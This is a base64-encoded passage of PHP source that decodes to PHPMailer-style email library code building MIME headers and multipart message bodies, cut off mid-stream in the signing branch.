SBlbHNlIHsNCiAgICAgICAgICAgICRteVhtYWlsZXIgPSB0cmltKCR0aGlzLT5YTWFpbGVyKTsNCiAgICAgICAgICAgIGlmICgkbXlYbWFpbGVyKSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnWC1NYWlsZXInLCAkbXlYbWFpbGVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgkdGhpcy0+Q29uZmlybVJlYWRpbmdUbyAhPSAnJykgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnRGlzcG9zaXRpb24tTm90aWZpY2F0aW9uLVRvJywgJzwnIC4gJHRoaXMtPkNvbmZpcm1SZWFkaW5nVG8gLiAnPicpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gQWRkIGN1c3RvbSBoZWFkZXJzDQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5DdXN0b21IZWFkZXIgYXMgJGhlYWRlcikgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgNCiAgICAgICAgICAgICAgICB0cmltKCRoZWFkZXJbMF0pLA0KICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIodHJpbSgkaGVhZGVyWzFdKSkNCiAgICAgICAgICAgICk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkdGhpcy0+c2lnbl9rZXlfZmlsZSkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTUlNRS1WZXJzaW9uJywgJzEuMCcpOw0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+Z2V0TWFpbE1JTUUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEdldCB0aGUgbWVzc2FnZSBNSU1FIHR5cGUgaGVhZGVycy4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGdldE1haWxNSU1FKCkNCiAgICB7DQogICAgICAgICRyZXN1bHQgPSAnJzsNCiAgICAgICAgJGlzbXVsdGlwYXJ0ID0gdHJ1ZTsNCiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7DQogICAgICAgICAgICBjYXNlICdpbmxpbmUnOg0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiCWJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhdHRhY2gnOg0KICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L21peGVkOycpOw0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCIJYm91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2FsdCc6DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoNCiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOw0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCIJYm91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgLy8gQ2F0Y2hlcyBjYXNlICdwbGFpbic6IGFuZCBjYXNlICcnOg0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCdDb250ZW50LVR5cGU6ICcgLiAkdGhpcy0+Q29udGVudFR5cGUgLiAnOyBjaGFyc2V0PScgLiAkdGhpcy0+Q2hhclNldCk7DQogICAgICAgICAgICAgICAgJGlzbXVsdGlwYXJ0ID0gZmFsc2U7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgLy8gUkZDMTM0MSBwYXJ0IDUgc2F5cyA3Yml0IGlzIGFzc3VtZWQgaWYgbm90IHNwZWNpZmllZA0KICAgICAgICBpZiAoJHRoaXMtPkVuY29kaW5nICE9ICc3Yml0Jykgew0KICAgICAgICAgICAgLy8gUkZDIDIwNDUgc2VjdGlvbiA2LjQgc2F5cyBtdWx0aXBhcnQgTUlNRSBwYXJ0cyBtYXkgb25seSB1c2UgN2JpdCwgOGJpdCBvciBiaW5hcnkgQ1RFDQogICAgICAgICAgICBpZiAoJGlzbXVsdGlwYXJ0KSB7DQogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5FbmNvZGluZyA9PSAnOGJpdCcpIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICc4Yml0Jyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIC8vIFRoZSBvbmx5IHJlbWFpbmluZyBhbHRlcm5hdGl2ZXMgYXJlIHF1b3RlZC1wcmludGFibGUgYW5kIGJhc2U2NCwgd2hpY2ggYXJlIGJvdGggN2JpdCBjb21wYXRpYmxlDQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCAkdGhpcy0+RW5jb2RpbmcpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFJldHVybnMgdGhlIHdob2xlIE1JTUUgbWVzc2FnZS4NCiAgICAgKiBJbmNsdWRlcyBjb21wbGV0ZSBoZWFkZXJzIGFuZCBib2R5Lg0KICAgICAqIE9ubHkgdmFsaWQgcG9zdCBwcmVTZW5kKCkuDQogICAgICogQHNlZSBQSFBNYWlsZXI6OnByZVNlbmQoKQ0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U2VudE1JTUVNZXNzYWdlKCkNCiAgICB7DQogICAgICAgIHJldHVybiBydHJpbSgkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLCAiDQoNCiIpIC4gc2VsZjo6Q1JMRiAuIHNlbGY6OkNSTEYgLiAkdGhpcy0+TUlNRUJvZHk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ3JlYXRlIHVuaXF1ZSBJRA0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdlbmVyYXRlSWQoKSB7DQogICAgICAgIHJldHVybiBtZDUodW5pcWlkKHRpbWUoKSkpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFzc2VtYmxlIHRoZSBtZXNzYWdlIGJvZHkuDQogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uDQogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGFzc2VtYmxlZCBtZXNzYWdlIGJvZHkNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gY3JlYXRlQm9keSgpDQogICAgew0KICAgICAgICAkYm9keSA9ICcnOw0KICAgICAgICAvL0NyZWF0ZSB1bmlxdWUgSURzIGFuZCBwcmVzZXQgYm91bmRhcmllcw0KICAgICAgICAkdGhpcy0+dW5pcXVlaWQgPSAkdGhpcy0+Z2VuZXJhdGVJZCgpOw0KICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0gPSAnYjFfJyAuICR0aGlzLT51bmlxdWVpZDsNCiAgICAgICAgJHRoaXMtPmJvdW5kYXJ5WzJdID0gJ2IyXycgLiAkdGhpcy0+dW5pcXVlaWQ7DQogICAgICAgICR0aGlzLT5ib3VuZGFyeVszXSA9ICdiM18nIC4gJHRoaXMtPnVuaXF1ZWlkOw0KDQogICAgICAgIGlmICgkdGhpcy0+c2lnbl9rZXlfZmlsZSkgew0KICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldE1haWxNSU1FKCkgLiAkdGhpcy0+TEU7DQogICAgICAgIH0NCg0KICAgICAgICAkdGhpcy0+c2V0V29yZFdyYXAoKTsNCg0KICAgICAgICAkYm9keUVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOw0KICAgICAgICAkYm9keUNoYXJTZXQgPSAkdGhpcy0+Q2hhclNldDsNCiAgICAgICAgLy9DYW4gd2UgZG8gYSA3LWJpdCBkb3duZ3JhZGU/DQogICAgICAgIGlmICgkYm9keUVuY29kaW5nID09ICc4Yml0JyBhbmQgISR0aGlzLT5oYXM4Yml0Q2hhcnMoJHRoaXMtPkJvZHkpKSB7DQogICAgICAgICAgICAkYm9keUVuY29kaW5nID0gJzdiaXQnOw0KICAgICAgICAgICAgLy9BbGwgSVNPIDg4NTksIFdpbmRvd3MgY29kZXBhZ2UgYW5kIFVURi04IGNoYXJzZXRzIGFyZSBhc2NpaSBjb21wYXRpYmxlIHVwIHRvIDctYml0DQogICAgICAgICAgICAkYm9keUNoYXJTZXQgPSAndXMtYXNjaWknOw0KICAgICAgICB9DQogICAgICAgIC8vSWYgbGluZXMgYXJlIHRvbyBsb25nLCBhbmQgd2UncmUgbm90IGFscmVhZHkgdXNpbmcgYW4gZW5jb2RpbmcgdGhhdCB3aWxsIHNob3J0ZW4gdGhlbSwNCiAgICAgICAgLy9jaGFuZ2UgdG8gcXVvdGVkLXByaW50YWJsZSB0cmFuc2ZlciBlbmNvZGluZyBmb3IgdGhlIGJvZHkgcGFydCBvbmx5DQogICAgICAgIGlmICgnYmFzZTY0JyAhPSAkdGhpcy0+RW5jb2RpbmcgYW5kIHNlbGY6Omhhc0xpbmVMb25nZXJUaGFuTWF4KCR0aGlzLT5Cb2R5KSkgew0KICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9ICdxdW90ZWQtcHJpbnRhYmxlJzsNCiAgICAgICAgfQ0KDQogICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7DQogICAgICAgICRhbHRCb2R5Q2hhclNldCA9ICR0aGlzLT5DaGFyU2V0Ow0KICAgICAgICAvL0NhbiB3ZSBkbyBhIDctYml0IGRvd25ncmFkZT8NCiAgICAgICAgaWYgKCRhbHRCb2R5RW5jb2RpbmcgPT0gJzhiaXQnIGFuZCAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+QWx0Qm9keSkpIHsNCiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAnN2JpdCc7DQogICAgICAgICAgICAvL0FsbCBJU08gODg1OSwgV2luZG93cyBjb2RlcGFnZSBhbmQgVVRGLTggY2hhcnNldHMgYXJlIGFzY2lpIGNvbXBhdGlibGUgdXAgdG8gNy1iaXQNCiAgICAgICAgICAgICRhbHRCb2R5Q2hhclNldCA9ICd1cy1hc2NpaSc7DQogICAgICAgIH0NCiAgICAgICAgLy9JZiBsaW5lcyBhcmUgdG9vIGxvbmcsIGFuZCB3ZSdyZSBub3QgYWxyZWFkeSB1c2luZyBhbiBlbmNvZGluZyB0aGF0IHdpbGwgc2hvcnRlbiB0aGVtLA0KICAgICAgICAvL2NoYW5nZSB0byBxdW90ZWQtcHJpbnRhYmxlIHRyYW5zZmVyIGVuY29kaW5nIGZvciB0aGUgYWx0IGJvZHkgcGFydCBvbmx5DQogICAgICAgIGlmICgnYmFzZTY0JyAhPSAkYWx0Qm9keUVuY29kaW5nIGFuZCBzZWxmOjpoYXNMaW5lTG9uZ2VyVGhhbk1heCgkdGhpcy0+QWx0Qm9keSkpIHsNCiAgICAgICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAncXVvdGVkLXByaW50YWJsZSc7DQogICAgICAgIH0NCiAgICAgICAgLy9Vc2UgdGhpcyBhcyBhIHByZWFtYmxlIGluIGFsbCBtdWx0aXBhcnQgbWVzc2FnZSB0eXBlcw0KICAgICAgICAkbWltZXByZSA9ICJUaGlzIGlzIGEgbXVsdGktcGFydCBtZXNzYWdlIGluIE1JTUUgZm9ybWF0LiIgLiAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgew0KICAgICAgICAgICAgY2FzZSAnaW5saW5lJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCIJYm91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAnJywgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsyXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0JzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5JY2FsKSkgew0KICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAnJywgJ3RleHQvY2FsZW5kYXI7IG1ldGhvZD1SRVFVRVNUJywgJycpOw0KICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5JY2FsLCAkdGhpcy0+RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIglib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCIJYm91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2F0dGFjaG1lbnQnLCAkdGhpcy0+Ym91bmRhcnlbMV0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOg0KICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIglib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdLCAkYWx0Qm9keUNoYXJTZXQsICd0ZXh0L3BsYWluJywgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiCWJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVszXSAuICciJyk7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbM10sICRib2R5Q2hhclNldCwgJ3RleHQvaHRtbCcsICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbM10pOw0KICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzJdKTsNCiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgIC8vIENhdGNoIGNhc2UgJ3BsYWluJyBhbmQgY2FzZSAnJywgYXBwbGllcyB0byBzaW1wbGUgYHRleHQvcGxhaW5gIGFuZCBgdGV4dC9odG1sYCBib2R5IGNvbnRlbnQgdHlwZXMNCiAgICAgICAgICAgICAgICAvL1Jlc2V0IHRoZSBgRW5jb2RpbmdgIHByb3BlcnR5IGluIGNhc2Ugd2UgY2hhbmdlZCBpdCBmb3IgbGluZSBsZW5ndGggcmVhc29ucw0KICAgICAgICAgICAgICAgICR0aGlzLT5FbmNvZGluZyA9ICRib2R5RW5jb2Rpbmc7DQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJHRoaXMtPkVuY29kaW5nKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgkdGhpcy0+aXNFcnJvcigpKSB7DQogICAgICAgICAgICAkYm9keSA9ICcnOw0KICAgICAgICB9IGVsc2VpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgaWYgKCFkZWZpbmVkKCdQS0NTN19URVhUJykpIHsNCiAgICAgICAgICAgICAgI